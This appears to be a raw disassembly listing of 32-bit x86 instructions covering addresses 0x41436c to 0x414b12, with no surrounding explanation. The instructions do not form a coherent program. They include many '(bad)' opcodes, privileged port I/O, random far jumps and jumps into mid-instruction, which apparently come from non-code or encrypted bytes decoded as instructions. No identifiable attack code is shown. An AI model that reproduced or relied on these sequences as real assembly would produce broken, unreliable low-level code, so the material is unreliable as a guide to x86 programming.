  41436c:	ss clc 
  41436e:	js     0x4143e4
  414370:	jb     0x414367
  414372:	xchg   esi,eax
  414373:	fs stos BYTE PTR es:[edi],al
  414375:	sar    DWORD PTR [ecx],cl
  414377:	test   al,0xd4
  414379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41437a:	push   ss
  41437b:	pop    ebx
  41437c:	aad    0x9d
  41437e:	mov    esp,0x3fdf8008
  414383:	xlat   BYTE PTR ds:[ebx]
  414384:	idiv   DWORD PTR [edx-0x1f076907]
  41438a:	mov    esi,0x31011422
  41438f:	xchg   esp,eax
  414390:	add    edi,DWORD PTR [esi]
  414392:	imul   edi,DWORD PTR [edx-0x3e],0x67
  414396:	fs in  eax,0x35
  414399:	adc    DWORD PTR [ecx+0x51a5c5ef],ebx
  41439f:	or     BYTE PTR [ebx+0x1084527a],0x53
  4143a6:	nop
  4143a7:	mov    ah,0xe1
  4143a9:	pop    ss
  4143aa:	arpl   bp,cx
  4143ac:	out    0x45,al
  4143ae:	jo     0x414369
  4143b0:	jp     0x4143e3
  4143b2:	or     eax,0x631fcbed
  4143b7:	les    edx,FWORD PTR [esi]
  4143b9:	jp     0x414424
  4143bb:	dec    edi
  4143bc:	push   ebp
  4143bd:	aaa    
  4143be:	ss mov bl,0x89
  4143c1:	sub    ecx,DWORD PTR [esp+edx*2+0x60]
  4143c5:	jmp    0xb907:0x1f769c54
  4143cc:	stc    
  4143cd:	mov    ds:0x9a8e65b3,al
  4143d2:	(bad)  
  4143d3:	cmp    dh,ah
  4143d5:	stos   DWORD PTR es:[edi],eax
  4143d6:	lods   al,BYTE PTR cs:[esi]
  4143d8:	mov    al,0x60
  4143da:	mov    al,0xe
  4143dc:	jnp    0x41441c
  4143de:	sar    DWORD PTR [ecx-0x22],cl
  4143e1:	repnz ss fdivrp st(5),st
  4143e5:	and    al,0x80
  4143e7:	or     eax,0x8a762d22
  4143ec:	pop    esi
  4143ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143ee:	out    dx,eax
  4143ef:	out    dx,al
  4143f0:	sbb    al,0xd3
  4143f2:	or     BYTE PTR [ecx+0x5b],dh
  4143f5:	jle    0x4143ef
  4143f7:	mov    ds,esp
  4143f9:	push   esp
  4143fa:	pop    ss
  4143fb:	ret    
  4143fc:	push   edi
  4143fd:	jmp    0xf131b055
  414402:	div    BYTE PTR [esi+0x75cbdbc5]
  414408:	or     al,BYTE PTR [ebx+0x62f6d5e8]
  41440e:	stos   DWORD PTR es:[edi],eax
  41440f:	inc    ecx
  414410:	cmp    al,0xf
  414412:	adc    edx,0xffffffc2
  414415:	mov    esi,0x8ee89a2b
  41441a:	int    0x85
  41441c:	mov    ds:0x39a3e276,eax
  414421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414422:	mov    ecx,0xc160ed44
  414427:	jge    0x4143ed
  414429:	idiv   ch
  41442b:	les    eax,FWORD PTR [eax+0xb]
  41442e:	jmp    0x41445a
  414430:	mov    eax,ds:0x39421507
  414435:	loopne 0x414414
  414437:	jp     0x4144b6
  414439:	addr16 xor al,0x47
  41443c:	pop    es
  41443d:	lock (bad) 
  414440:	fnstsw WORD PTR [eax+0x36b00347]
  414446:	mov    esi,0x95162785
  41444b:	xor    BYTE PTR [esi-0x4755994c],bh
  414451:	inc    edx
  414452:	or     ch,ch
  414454:	repz cli 
  414456:	or     BYTE PTR [esi],bl
  414458:	mov    bl,0x45
  41445a:	xchg   ebp,eax
  41445b:	sub    cl,BYTE PTR [edx+ebp*1]
  41445e:	data16 (bad) 
  414460:	or     eax,0x79be2cb2
  414465:	jl     0x414489
  414467:	push   edi
  414468:	popf   
  414469:	push   0x8644fc21
  41446e:	push   edx
  41446f:	lea    ebx,[ebp-0x3781d0c9]
  414475:	inc    esi
  414476:	inc    eax
  414477:	xchg   ebp,eax
  414478:	mov    eax,0x13fa4bb0
  41447d:	pop    edi
  41447e:	setg   ch
  414481:	mov    dl,0x3
  414483:	pop    ecx
  414484:	ss scas al,BYTE PTR es:[edi]
  414486:	(bad)  
  414487:	push   esp
  414488:	mov    WORD PTR [ecx-0x74f2a7a3],?
  41448e:	sbb    edi,0xe7fcf2f5
  414494:	mov    bl,0xca
  414496:	dec    edi
  414497:	pop    ebx
  414498:	jno    0x414422
  41449a:	sbb    edx,DWORD PTR [edx-0x5f]
  41449d:	shl    DWORD PTR [esi-0x715b232a],1
  4144a3:	push   ebp
  4144a4:	cmp    ebx,DWORD PTR ds:0xf3d50bd7
  4144aa:	scas   al,BYTE PTR es:[edi]
  4144ab:	add    al,0xd3
  4144ad:	cdq    
  4144ae:	icebp  
  4144af:	test   BYTE PTR [edx+0x43],al
  4144b2:	(bad)  
  4144b3:	ins    DWORD PTR es:[edi],dx
  4144b4:	fs push 0x6d972f22
  4144ba:	sub    eax,0xd180267e
  4144bf:	fs dec esp
  4144c1:	mul    BYTE PTR [eax-0x67fea399]
  4144c7:	xor    ebx,DWORD PTR [esp+ebx*2+0x28]
  4144cb:	frstor [edx+0x5c]
  4144ce:	mov    BYTE PTR ds:0xf4592334,dl
  4144d4:	inc    edx
  4144d5:	call   0x867005d1
  4144da:	jae    0x414519
  4144dc:	sbb    al,BYTE PTR [ecx]
  4144de:	pop    esp
  4144df:	jge    0x4144fa
  4144e1:	lods   al,BYTE PTR ds:[esi]
  4144e2:	das    
  4144e3:	clc    
  4144e4:	fisttp DWORD PTR [eax+0x5d]
  4144e7:	sbb    al,0x44
  4144e9:	lock loop 0x4144aa
  4144ec:	call   0x53a8:0x27eca320
  4144f3:	ret    
  4144f4:	or     eax,0x6f2c532c
  4144f9:	xor    al,0xc6
  4144fb:	fld    QWORD PTR [edi+0x65]
  4144fe:	inc    ebp
  4144ff:	ds jnp 0x414561
  414502:	ficomp WORD PTR [edi]
  414504:	loopne 0x41456a
  414506:	fcmovu st,st(3)
  414508:	popf   
  414509:	pop    ds
  41450a:	push   ss
  41450b:	mov    eax,0x1bf355ae
  414510:	test   al,0xc4
  414512:	lods   eax,DWORD PTR ds:[esi]
  414513:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414514:	jmp    0x41458f
  414516:	das    
  414517:	mov    dh,0x3d
  414519:	das    
  41451a:	add    esp,esp
  41451c:	push   edx
  41451d:	xchg   edx,eax
  41451e:	push   ebx
  41451f:	out    dx,al
  414520:	push   eax
  414521:	xchg   ebp,eax
  414522:	test   BYTE PTR [edi-0x6036083f],0x6a
  414529:	stos   BYTE PTR es:[edi],al
  41452a:	xlat   BYTE PTR ds:[ebx]
  41452b:	cmc    
  41452c:	adc    BYTE PTR [esi+0x1ef53089],cl
  414532:	outs   dx,BYTE PTR ds:[esi]
  414533:	add    al,0x66
  414535:	mov    dh,0xf2
  414537:	xchg   ecx,eax
  414538:	and    DWORD PTR [ebx+ebx*4],0x29
  41453c:	add    DWORD PTR [ebp+0x47],ecx
  41453f:	inc    ecx
  414540:	bound  ebp,QWORD PTR [esi-0xc]
  414543:	jmp    0x99b89d89
  414548:	jo     0x414569
  41454a:	aas    
  41454b:	xor    BYTE PTR [esi+0x50],0x72
  41454f:	outs   dx,DWORD PTR ds:[esi]
  414550:	push   0x6cb0201f
  414555:	aam    0x8b
  414557:	pop    es
  414558:	mov    eax,0xc6f80a2e
  41455d:	les    edi,FWORD PTR ds:0x2e12e672
  414563:	das    
  414564:	mov    al,0xd3
  414567:	push   eax
  414568:	ret    0x216e
  41456b:	popa   
  41456c:	xchg   esi,eax
  41456d:	push   cs
  41456e:	mov    eax,0x2da1f989
  414573:	rol    BYTE PTR [ebp+0x75],1
  414576:	adc    dh,bl
  414578:	mov    bl,0x5c
  41457a:	xor    BYTE PTR [edi+esi*1],ah
  41457d:	mov    dh,0x17
  41457f:	int3   
  414580:	mov    esi,DWORD PTR [edi+0x3111006f]
  414586:	imul   ecx,ebx,0x1b
  414589:	mov    bh,0x2
  41458b:	sub    eax,DWORD PTR [edi+0xf915cd7]
  414591:	cmp    eax,0xc199901a
  414596:	mov    ds:0xf0ec3d9d,eax
  41459b:	(bad)  
  41459c:	sub    ecx,edi
  41459e:	dec    edx
  41459f:	test   ecx,0x48f5aec1
  4145a5:	ror    edx,0x7c
  4145a8:	retf   0x1cd5
  4145ab:	mov    al,0x35
  4145ad:	call   0x50a1:0x25d05d0d
  4145b4:	bound  esp,QWORD PTR [eax-0x7d665e71]
  4145ba:	cli    
  4145bb:	xchg   BYTE PTR [edx-0x19],cl
  4145be:	int3   
  4145bf:	sbb    al,0x35
  4145c1:	std    
  4145c2:	mov    ds:0xc5a659ef,al
  4145c7:	xor    DWORD PTR [ebx],esi
  4145c9:	repnz push edi
  4145cb:	sbb    eax,0x75fcffd9
  4145d0:	pop    edx
  4145d1:	out    dx,eax
  4145d2:	int    0x44
  4145d4:	sbb    DWORD PTR [edi+0x9daaed7],esp
  4145da:	imul   ebx
  4145dc:	pop    edx
  4145dd:	fcom   QWORD PTR ds:0x7fe3dfeb
  4145e3:	test   BYTE PTR [esi+edi*4],ah
  4145e6:	lods   eax,DWORD PTR ds:[esi]
  4145e7:	imul   esi,DWORD PTR [esi+0x7b1565a8],0x47294cef
  4145f1:	cs ja  0x4145f5
  4145f4:	scas   eax,DWORD PTR es:[edi]
  4145f5:	arpl   WORD PTR [ebp-0x3132e980],si
  4145fb:	jge    0x414660
  4145fd:	mov    cl,0x5f
  4145ff:	sbb    eax,0x41b9aead
  414604:	shl    BYTE PTR [ebp+0x5fad40a6],cl
  41460a:	je     0x4145da
  41460c:	test   eax,0xd322e00d
  414611:	pop    edi
  414612:	pop    eax
  414613:	pop    ebx
  414614:	add    al,0x9c
  414616:	div    dl
  414618:	out    0x1f,eax
  41461a:	rol    DWORD PTR [edi-0x2be1f3e4],0xe0
  414621:	xor    ah,ch
  414623:	sbb    BYTE PTR [ebp-0x1af3e19],ah
  414629:	inc    ebp
  41462a:	rol    cl,cl
  41462c:	out    0xab,eax
  41462e:	loopne 0x41460f
  414630:	leave  
  414631:	das    
  414632:	or     ch,BYTE PTR [esi]
  414634:	dec    edi
  414635:	rcr    DWORD PTR [edx-0x3c],0x2d
  414639:	sar    BYTE PTR [eax-0x4c],cl
  41463c:	inc    ecx
  41463d:	adc    dh,bl
  41463f:	loop   0x4146a2
  414641:	and    DWORD PTR [ebx],ebp
  414643:	pop    ds
  414644:	xchg   DWORD PTR [ebx],esp
  414646:	aam    0x8a
  414648:	mov    dh,BYTE PTR [esi+ecx*1]
  41464b:	dec    ebx
  41464c:	sti    
  41464d:	shr    BYTE PTR [ecx],cl
  41464f:	lock jecxz 0x41461d
  414652:	push   esp
  414653:	and    ecx,DWORD PTR [edi+esi*4+0x57]
  414657:	push   edx
  414658:	pop    ebx
  414659:	mov    cl,0xc1
  41465b:	daa    
  41465c:	adc    al,0x2d
  41465e:	(bad)  
  414660:	ret    
  414661:	cmp    cl,BYTE PTR [edx]
  414663:	(bad)  
  414664:	xor    eax,0x21792401
  414669:	add    BYTE PTR [esi+0x2831083e],dl
  41466f:	cmp    edx,ecx
  414671:	jmp    0x87bb:0xb3c109cd
  414678:	pop    ecx
  414679:	pop    es
  41467a:	mov    ecx,0x7a7a4224
  41467f:	or     cl,BYTE PTR [ebp+0x44]
  414682:	into   
  414683:	rol    DWORD PTR [edx+0x44d9565],1
  414689:	pop    es
  41468a:	jle    0x414615
  41468c:	sub    DWORD PTR [ecx],edi
  41468e:	xchg   ebx,eax
  41468f:	lahf   
  414690:	(bad)  
  414691:	dec    edx
  414692:	dec    ebp
  414693:	iret   
  414694:	adc    ch,ah
  414696:	or     DWORD PTR [edi+eiz*8],edx
  414699:	or     ebx,DWORD PTR [ebx]
  41469b:	rcl    DWORD PTR [ecx-0x5d3a6e93],1
  4146a1:	enter  0xb3a1,0x90
  4146a5:	mov    esp,0xb32b53e4
  4146aa:	sbb    ebx,ebx
  4146ac:	frstor [edx+0x76107a]
  4146b2:	inc    ecx
  4146b3:	gs stos DWORD PTR es:[edi],eax
  4146b5:	mov    bl,0x2c
  4146b7:	mov    ch,0x8a
  4146b9:	adc    al,0x55
  4146bb:	xchg   edi,eax
  4146bc:	mov    bh,BYTE PTR [edi]
  4146be:	stc    
  4146bf:	and    esi,DWORD PTR [ebp+0x39]
  4146c2:	out    dx,al
  4146c3:	jo     0x4146bb
  4146c5:	mov    al,ds:0x97bcc9ca
  4146ca:	dec    ecx
  4146cb:	ja     0x414723
  4146cd:	pop    esi
  4146ce:	ss mov bl,0x3a
  4146d1:	scas   al,BYTE PTR es:[edi]
  4146d2:	push   ss
  4146d3:	push   ss
  4146d4:	sub    cl,bh
  4146d6:	jge    0x41466a
  4146d8:	dec    edi
  4146d9:	std    
  4146da:	mov    BYTE PTR [edx-0x34],0xf6
  4146de:	out    0x75,eax
  4146e0:	cs push es
  4146e2:	imul   BYTE PTR [edx]
  4146e4:	sbb    cl,BYTE PTR [ecx]
  4146e6:	cmp    eax,0x5ed91463
  4146eb:	sbb    bl,bl
  4146ed:	retf   0x7070
  4146f0:	out    dx,eax
  4146f1:	into   
  4146f2:	adc    al,0xb5
  4146f4:	je     0x4146b1
  4146f6:	inc    eax
  4146f7:	cmc    
  4146f8:	loop   0x4146be
  4146fa:	xor    DWORD PTR [ecx+ebp*2-0x69],0x1f1d6dd9
  414702:	mov    WORD PTR [ecx+0x77],fs
  414705:	popf   
  414706:	out    dx,eax
  414707:	mov    ds:0xa52ac8cf,al
  41470c:	out    0x34,eax
  41470e:	into   
  41470f:	arpl   WORD PTR [eax+ebp*1-0x6c],bx
  414713:	pop    eax
  414714:	lods   eax,DWORD PTR ds:[esi]
  414715:	int    0xf
  414717:	and    BYTE PTR [esi],cl
  414719:	sub    bl,BYTE PTR [edi+0x5d61542b]
  41471f:	inc    ebx
  414720:	(bad)  
  414721:	shl    ah,0xa8
  414724:	ja     0x414749
  414726:	sub    eax,0xbd96b138
  41472b:	jmp    0x4147a4
  41472d:	fst    QWORD PTR [esi]
  41472f:	cmc    
  414730:	adc    bl,dl
  414732:	aas    
  414733:	mov    eax,DWORD PTR [eax-0x30f47cf3]
  414739:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  41473d:	or     BYTE PTR [eax],cl
  41473f:	shl    edx,0x1e
  414742:	mov    edx,DWORD PTR [esi]
  414744:	mov    ecx,DWORD PTR [esi+0x4]
  414747:	jmp    0x414cd1
  41474c:	arpl   WORD PTR [edx-0x67eb5a1b],bx
  414752:	and    esp,DWORD PTR [eax]
  414754:	stos   DWORD PTR es:[edi],eax
  414755:	sub    eax,eax
  414757:	scas   al,BYTE PTR es:[edi]
  414758:	jecxz  0x4146da
  41475a:	inc    esp
  41475b:	test   al,0x6f
  41475d:	fisttp QWORD PTR [esi+edx*1]
  414760:	cmp    eax,0x88161604
  414765:	stos   BYTE PTR es:[edi],al
  414766:	sub    eax,0xa34d721f
  41476b:	pop    eax
  41476c:	xor    al,0x61
  41476e:	or     al,0x51
  414770:	ret    0xb3fc
  414773:	jl     0x4147a7
  414775:	pop    ebx
  414776:	push   es
  414777:	not    edx
  414779:	inc    eax
  41477a:	stos   BYTE PTR es:[edi],al
  41477b:	xchg   edx,eax
  41477c:	xchg   edx,eax
  41477d:	sahf   
  41477e:	lods   al,BYTE PTR ds:[esi]
  41477f:	mov    ebp,0x8cc1c3b
  414784:	xchg   edi,eax
  414785:	mov    al,0xa3
  414787:	push   ebx
  414788:	loopne 0x414787
  41478a:	daa    
  41478b:	ss mov esp,0x1c620d19
  414791:	jecxz  0x41476d
  414793:	pushf  
  414794:	add    al,0xda
  414796:	jge    0x414802
  414798:	rcl    dl,cl
  41479a:	xchg   edi,eax
  41479b:	adc    ah,ah
  41479d:	imul   esp,edx,0x2847fb9
  4147a3:	movsx  esp,WORD PTR [eax-0x6bb3175]
  4147aa:	sti    
  4147ab:	cmp    al,0x4a
  4147ad:	int    0x7
  4147af:	ret    
  4147b0:	dec    ebp
  4147b1:	push   ebp
  4147b2:	fs pop edi
  4147b4:	and    ecx,edx
  4147b6:	push   es
  4147b7:	shr    DWORD PTR [ecx],cl
  4147b9:	sbb    BYTE PTR [ecx+0x76],dl
  4147bc:	jo     0x414804
  4147be:	add    eax,0xd7ff5d13
  4147c3:	push   ds
  4147c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147c5:	in     eax,dx
  4147c6:	push   ss
  4147c7:	mov    dh,0x6d
  4147c9:	xchg   edx,eax
  4147ca:	fidivr DWORD PTR [ecx+0x7]
  4147cd:	test   al,0xb0
  4147cf:	mov    edi,?
  4147d1:	das    
  4147d2:	adc    BYTE PTR [esp+ebp*2-0x50],bh
  4147d6:	je     0x4147b2
  4147d8:	cmp    bh,dh
  4147da:	fstp   DWORD PTR fs:[edx+0x57c62d06]
  4147e1:	sub    bh,BYTE PTR [edx+0x7ac74378]
  4147e7:	push   ss
  4147e8:	aad    0x2b
  4147ea:	popf   
  4147eb:	fcomp  DWORD PTR [eax+0x62]
  4147ee:	les    esp,FWORD PTR [edi]
  4147f0:	push   ds
  4147f1:	fbld   TBYTE PTR [eax]
  4147f3:	mov    WORD PTR [edx-0x4],fs
  4147f6:	or     BYTE PTR ds:0xc92a,ah
  4147fb:	mov    eax,ds:0xbe05110e
  414800:	push   0x82e60b0c
  414805:	mov    al,0xf8
  414807:	jp     0x41487a
  414809:	pop    ebp
  41480a:	jmp    0x31b5e920
  41480f:	cdq    
  414810:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414811:	std    
  414812:	mov    ds:0x33933043,eax
  414817:	call   0xa7ce:0x927ee049
  41481e:	mov    esi,0x8e0f2dd9
  414823:	ins    DWORD PTR es:[edi],dx
  414824:	or     BYTE PTR [edx-0x28],bh
  414827:	cmp    eax,esi
  414829:	stos   DWORD PTR es:[edi],eax
  41482a:	jns    0x4147fa
  41482c:	cs or  al,0x7c
  41482f:	cs push cs
  414831:	imul   eax,DWORD PTR [edx-0x5c],0x9
  414835:	jecxz  0x4147d6
  414837:	cdq    
  414838:	lea    eax,[ecx-0x1f]
  41483b:	adc    eax,0x19e75bb6
  414840:	sbb    ah,BYTE PTR [ecx+0x48db987]
  414846:	cmp    ecx,eax
  414848:	cmp    eax,DWORD PTR [eax]
  41484a:	mov    esp,0x5ce077ff
  41484f:	mov    al,ds:0xf0e1206e
  414854:	pop    ss
  414855:	retf   0xe8c6
  414858:	jecxz  0x4147dd
  41485a:	inc    ebx
  41485b:	aas    
  41485c:	pushf  
  41485d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41485e:	xchg   ebp,eax
  41485f:	lods   eax,DWORD PTR ds:[esi]
  414860:	dec    esi
  414861:	mov    eax,ds:0x2dc87e24
  414866:	jmp    0xa946:0xde834f35
  41486d:	(bad)  
  41486e:	mul    bh
  414870:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414871:	sbb    DWORD PTR [ebx+ecx*1],esi
  414874:	or     cl,al
  414876:	bound  eax,QWORD PTR [eax+0x51c8425]
  41487c:	(bad)  
  41487d:	loope  0x414873
  41487f:	pop    eax
  414880:	das    
  414881:	pop    es
  414882:	pop    edx
  414883:	push   ecx
  414884:	gs ins DWORD PTR es:[edi],dx
  414886:	daa    
  414887:	int    0x7e
  414889:	rcl    BYTE PTR [esi-0xd82ce4b],0x2b
  414890:	fcomp  QWORD PTR [edi+0x12]
  414893:	and    al,0x1f
  414895:	jno    0x4148e3
  414897:	cld    
  414898:	outs   dx,DWORD PTR ds:[esi]
  414899:	jmp    0xbeecf53a
  41489e:	push   0xd63aafa0
  4148a3:	sbb    eax,0xf2266ae4
  4148a8:	xor    ch,BYTE PTR [eax+0x2f]
  4148ab:	lahf   
  4148ac:	iret   
  4148ad:	adc    eax,0xc045c541
  4148b2:	push   esi
  4148b3:	or     DWORD PTR [edi],ecx
  4148b5:	daa    
  4148b6:	ins    BYTE PTR es:[edi],dx
  4148b7:	daa    
  4148b8:	pop    ebx
  4148b9:	mov    ebp,0xe048e301
  4148be:	imul   edx,DWORD PTR [edi+0x52],0xffffffab
  4148c2:	fcomip st,st(6)
  4148c4:	div    DWORD PTR [edi-0x2b20ddb5]
  4148ca:	rcr    BYTE PTR [eax-0x53334472],1
  4148d0:	fs push esi
  4148d2:	retf   
  4148d3:	sahf   
  4148d4:	pop    es
  4148d5:	outs   dx,DWORD PTR ds:[esi]
  4148d6:	icebp  
  4148d7:	xchg   ebp,eax
  4148d8:	add    eax,0x82e68f61
  4148dd:	cmp    DWORD PTR [esi-0x6ae76fe3],ebx
  4148e3:	xor    esp,DWORD PTR [edx-0x2b]
  4148e6:	dec    ecx
  4148e7:	xchg   ebx,eax
  4148e8:	dec    edx
  4148e9:	inc    ecx
  4148ea:	fcomp  QWORD PTR [edi+ecx*4-0x74]
  4148ee:	js     0x41492e
  4148f0:	std    
  4148f1:	dec    eax
  4148f2:	push   esi
  4148f3:	inc    edx
  4148f4:	sti    
  4148f5:	inc    esi
  4148f6:	ss loop 0x414892
  4148f9:	dec    ebx
  4148fb:	in     eax,0x20
  4148fd:	(bad)  
  4148fe:	out    0x2c,eax
  414900:	std    
  414901:	int3   
  414902:	in     eax,dx
  414903:	pop    edx
  414904:	or     ch,ch
  414906:	inc    ebx
  414907:	out    dx,al
  414908:	jne    0x4148c5
  41490a:	xor    dl,BYTE PTR [esi]
  41490c:	xor    ch,cl
  41490e:	fst    DWORD PTR [ecx+ecx*1-0x4c]
  414912:	imul   DWORD PTR [ebx]
  414914:	mov    bl,0xd4
  414916:	push   ecx
  414917:	cdq    
  414918:	add    eax,ebp
  41491a:	cmp    al,0xd6
  41491c:	jg     0x4148df
  41491e:	(bad)  
  414920:	mov    dl,0x47
  414922:	mov    al,ds:0x6d4e3d3b
  414927:	jo     0x414965
  414929:	lock pop DWORD PTR [ecx+0x4c]
  41492d:	pop    esp
  41492e:	rcl    DWORD PTR [edi-0x48],cl
  414931:	data16 daa 
  414933:	enter  0xf0c0,0x95
  414937:	pop    edi
  414938:	pop    esi
  414939:	ret    
  41493a:	aas    
  41493b:	clc    
  41493c:	dec    esi
  41493d:	stc    
  41493e:	dec    edi
  41493f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414940:	inc    ecx
  414941:	pop    ebp
  414942:	test   BYTE PTR [edx],ah
  414944:	bound  esi,QWORD PTR [ebx]
  414946:	push   ds
  414947:	sahf   
  414948:	push   es
  414949:	adc    al,0xd7
  41494b:	mov    cl,0x8f
  41494d:	nop
  41494e:	sti    
  41494f:	adc    ebx,eax
  414951:	rcl    DWORD PTR [ecx-0x54ebd868],cl
  414957:	call   0x37d0:0x50b14804
  41495e:	lods   eax,DWORD PTR ds:[esi]
  41495f:	xchg   esi,eax
  414960:	in     al,0xb3
  414962:	dec    ebp
  414963:	sbb    ebp,DWORD PTR [edi-0x2531bb03]
  414969:	push   ebp
  41496a:	and    DWORD PTR [ebx-0x20],edi
  41496d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41496e:	gs pop ds
  414970:	clc    
  414971:	inc    esi
  414972:	mov    ebx,0x491ac460
  414977:	pop    ebp
  414978:	(bad)  
  414979:	out    dx,eax
  41497a:	mov    eax,ds:0x4eb43f6e
  41497f:	ins    BYTE PTR es:[edi],dx
  414980:	lods   eax,DWORD PTR ds:[esi]
  414981:	cmp    BYTE PTR [ebp-0x44ad3056],ch
  414987:	int    0xfe
  414989:	je     0x4149b2
  41498b:	dec    ebp
  41498c:	pop    esp
  41498d:	bnd jae 0x4149c6
  414990:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414991:	test   DWORD PTR [ebx-0x7fdc543c],ecx
  414997:	jmp    0x7958c69c
  41499c:	dec    edx
  41499d:	rcr    DWORD PTR [ebx-0x312a99b8],0x8e
  4149a4:	and    DWORD PTR [edi],esi
  4149a6:	and    eax,edi
  4149a8:	xlat   BYTE PTR ds:[ebx]
  4149a9:	mov    ds:0x362fbf26,al
  4149ae:	fidivr WORD PTR [edi+0x58]
  4149b1:	dec    esi
  4149b2:	pusha  
  4149b3:	mov    dl,0x1d
  4149b5:	mov    bh,0x7e
  4149b7:	inc    ebx
  4149b8:	mov    DWORD PTR [edi],esi
  4149ba:	jmp    0xffcf:0x18b17dc3
  4149c1:	xor    BYTE PTR [ecx],ch
  4149c3:	enter  0xbf8,0xdf
  4149c7:	sbb    eax,edx
  4149c9:	cdq    
  4149ca:	fdivr  st,st(1)
  4149cc:	inc    ebx
  4149cd:	or     eax,0x5e21a49f
  4149d2:	stos   BYTE PTR es:[edi],al
  4149d3:	repz xchg ebp,eax
  4149d5:	ds pop ebp
  4149d7:	cmp    DWORD PTR [esi+0x71],0xffffffd2
  4149db:	push   cs
  4149dc:	outs   dx,BYTE PTR ds:[esi]
  4149dd:	jge    0x41499f
  4149df:	push   edx
  4149e0:	inc    esp
  4149e1:	jns    0x4149a3
  4149e3:	or     BYTE PTR [esi*2-0x3c94cac0],bh
  4149ea:	enter  0x3945,0x3b
  4149ee:	sub    al,0xa5
  4149f0:	scas   al,BYTE PTR es:[edi]
  4149f1:	cmp    BYTE PTR [ebp+0x16],cl
  4149f4:	sti    
  4149f5:	mov    dh,0x91
  4149f7:	div    bl
  4149f9:	fbstp  TBYTE PTR [edi+0x36]
  4149fc:	mov    ecx,0x6d3dae2b
  414a01:	add    esp,edx
  414a03:	lds    ebx,FWORD PTR [edx-0x3c]
  414a06:	outs   dx,DWORD PTR ds:[esi]
  414a07:	inc    esi
  414a08:	sbb    DWORD PTR [eax],esp
  414a0a:	mov    ds:0x8122fe08,eax
  414a0f:	jp     0x414a52
  414a11:	aaa    
  414a12:	aas    
  414a13:	ds clc 
  414a15:	push   ds
  414a16:	and    esi,DWORD PTR ds:0x96b269db
  414a1c:	mov    bh,0x7d
  414a1e:	push   ds
  414a1f:	cld    
  414a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a21:	pushf  
  414a22:	lea    esp,[eax-0x2f]
  414a25:	fs dec ebp
  414a27:	cmp    edx,DWORD PTR [edx+0x7a8bfe]
  414a2d:	out    0x40,eax
  414a2f:	push   0x345aeb40
  414a34:	adc    eax,0xc45da0a3
  414a39:	dec    ebp
  414a3a:	and    DWORD PTR [ebx+0x7d],ebp
  414a3d:	sar    BYTE PTR [esi],cl
  414a3f:	lea    ebx,[ecx+0x42]
  414a42:	adc    edx,DWORD PTR [edx+0x12]
  414a45:	in     al,dx
  414a46:	jb     0x414a46
  414a48:	mov    ds:0x9db178c,al
  414a4d:	std    
  414a4e:	push   cs
  414a4f:	(bad)  
  414a50:	fisttp QWORD PTR [ecx-0xfa645fa]
  414a56:	and    esi,DWORD PTR [esi]
  414a58:	and    al,0x7b
  414a5a:	ss xchg ecx,eax
  414a5c:	sbb    BYTE PTR gs:[eax+0x3],bl
  414a60:	jecxz  0x414a0a
  414a62:	jg     0x414a09
  414a64:	pop    es
  414a65:	xchg   esi,eax
  414a66:	(bad)  
  414a67:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a69:	pop    edx
  414a6a:	sbb    bh,BYTE PTR [edx+0x7276431e]
  414a70:	xor    eax,0xdb228c5c
  414a75:	(bad)  
  414a76:	push   esp
  414a77:	xchg   esi,esp
  414a79:	ret    
  414a7a:	pusha  
  414a7b:	fcomp  DWORD PTR [edx]
  414a7d:	push   edx
  414a7e:	cdq    
  414a7f:	sbb    eax,0x97c7337e
  414a84:	call   0xb2c64fc8
  414a89:	sub    eax,ebx
  414a8b:	retf   
  414a8c:	(bad)  
  414a8d:	dec    edi
  414a8e:	or     BYTE PTR [ecx+edx*1],ch
  414a91:	ins    BYTE PTR es:[edi],dx
  414a92:	fsubr  st(3),st
  414a94:	(bad)  
  414a96:	xchg   esi,eax
  414a97:	pop    ebp
  414a98:	push   ds
  414a99:	inc    ebp
  414a9a:	dec    eax
  414a9b:	in     al,dx
  414a9c:	(bad)  
  414a9e:	test   eax,0x89e3c4ef
  414aa3:	rcl    DWORD PTR [esi],0x56
  414aa6:	push   0x40e1f440
  414aab:	xor    BYTE PTR [ecx+0x66],ch
  414aae:	xchg   edi,eax
  414aaf:	addr16 (bad) 
  414ab1:	into   
  414ab2:	test   eax,0x56537bb4
  414ab7:	xchg   esi,eax
  414ab8:	jge    0x414ad5
  414aba:	sbb    eax,0xb2a5421a
  414abf:	loop   0x414a42
  414ac1:	daa    
  414ac2:	test   BYTE PTR [ecx],bl
  414ac4:	mov    ds:0x90f3d808,al
  414ac9:	mov    edi,0x46ab5e33
  414ace:	xchg   bh,dl
  414ad0:	pop    ds
  414ad1:	lahf   
  414ad2:	mov    ?,WORD PTR [esi]
  414ad4:	pusha  
  414ad5:	je     0x414a7c
  414ad7:	sub    al,0x5a
  414ad9:	or     DWORD PTR [edi],ecx
  414adb:	mov    eax,ds:0xc578e83d
  414ae0:	mov    cs,edi
  414ae2:	out    dx,eax
  414ae3:	mov    ah,BYTE PTR [ebx+0x17679545]
  414ae9:	jmp    0x414ad5
  414aeb:	stos   DWORD PTR es:[edi],eax
  414aec:	fucom  st(4)
  414aee:	aam    0x6d
  414af0:	mov    ds:0x870e9035,eax
  414af5:	outs   dx,DWORD PTR ds:[esi]
  414af6:	fxch   st(2)
  414af8:	in     eax,0xb4
  414afa:	inc    eax
  414afb:	mov    esp,0x688a28eb
  414b00:	and    eax,0x3c8f10e5
  414b05:	pop    esp
  414b06:	xor    ebp,esp
  414b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b09:	jo     0x414afa
  414b0b:	push   es
  414b0c:	pop    ecx
  414b0d:	dec    esi
  414b0e:	test   al,0x8d
  414b10:	(bad)  
  414b11:	into   
  414b12:	mov    al,ds:0xc3f4b1ae
